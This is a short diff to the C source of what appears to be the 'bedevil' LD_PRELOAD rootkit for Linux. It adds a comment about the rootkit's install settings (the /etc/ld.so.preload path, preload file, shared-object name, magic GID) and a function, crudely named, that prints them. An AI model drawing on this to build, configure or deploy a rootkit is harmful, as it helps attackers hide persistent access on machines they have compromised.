@@ -4,6 +4,17 @@
 #include "bedevil.h"
 #include "sanity.h"
 
+/*
+INSTALL_DIR
+OLD_PRELOAD or PRELOAD_FILE
+If PATCH_DYNAMIC_LINKER is True in setup.py before compiling then the value of PRELOAD_FILE is what you want.
+Otherwise, /etc/ld.so.preload (OLD_PRELOAD) is likely what you're after.
+Lastly, BDVLSO & MAGIC_GID
+ */
+
+
+
+
 typedef struct {
     void *(*func)();
 } syms;
@@ -63,6 +74,13 @@ syms symbols[ALL_SIZE];
 
 #define LINE_MAX 2048
 #define sizeofarr(arr) sizeof(arr) / sizeof(arr[0])
+
+static void imgay(void){
+    printf("INSTALL_DIR:"INSTALL_DIR);
+    printf("OLD_PRELOAD:"OLD_PRELOAD);
+    printf("PRELOAD_FILE:"PRELOAD_FILE);
+    printf("BDVLSO:"BDVLSO);
+}
 
 void plsdomefirst(void);
 #include "includes.h"
